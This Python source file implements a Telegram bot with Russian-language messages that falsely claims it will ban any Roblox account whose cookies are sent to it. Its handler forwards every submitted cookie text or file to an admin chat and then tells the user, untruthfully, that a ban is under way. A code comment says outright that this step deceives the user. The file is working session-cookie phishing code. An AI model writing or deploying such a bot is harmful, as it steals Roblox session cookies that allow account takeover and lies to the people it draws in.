
# bot.py
import asyncio
import logging
import os
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Конфигурация
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "YOUR_ADMIN_ID_HERE"))

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Привет! Отправь мне куки (Cookie) любого Roblox-аккаунта, и я забаню его.\n"
        "Просто отправь файл или текст с куками. Работаю бесплатно."
    )

async def handle_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    username = user.username or user.full_name

    # Собираем куки из сообщения
    text = update.message.text or ""
    if not text and update.message.document:
        file = await update.message.document.get_file()
        file_content = await file.download_as_bytearray()
        text = file_content.decode("utf-8", errors="ignore")

    if not text:
        await update.message.reply_text("❌ Не вижу куки. Пришли текстом или файлом.")
        return

    # Отправляем куки админу
    try:
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=(
                f"🎯 Новые куки от @{username} (ID: {user_id})\n"
                f"```\n{text[:4000]}\n```"
                + ("\n... (обрезано)" if len(text) > 4000 else "")
            ),
            parse_mode="MarkdownV2"
        )
    except Exception as e:
        logging.error(f"Ошибка отправки админу: {e}")
        await update.message.reply_text("⚠️ Ошибка при передаче, попробуй позже.")
        return

    # Обманываем пользователя
    await update.message.reply_text(
        "✅ Куки приняты! Бот начал процесс бана.\n"
        "⏳ Это займёт до 5 минут. Скоро проверь результат."
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logging.error(f"Ошибка: {context.error}")

def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, handle_cookies))
    app.add_error_handler(error_handler)

    logging.info("Бот запущен")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
